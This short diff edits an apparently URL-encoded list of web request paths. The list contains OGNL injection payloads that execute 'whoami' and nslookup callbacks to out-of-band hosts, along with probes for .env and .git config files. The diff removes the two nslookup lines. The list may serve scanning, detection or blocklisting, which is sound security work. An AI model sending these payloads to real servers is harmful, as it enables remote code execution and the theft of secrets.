@@ -22,8 +22,6 @@
 /%20%20%20%20%22/private/.env%22,
 /%23
 /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
-/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d4a5prv49vdaa9kud8ig6o7dqgs714icg.oast.fun%22%29%7D/
-/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d6052qmh6nb0madbjp40jiyt1gfzatxdi.oast.me%22%29%7D/
 /%25
 /%2eenv
 /%2egit/%63onfig
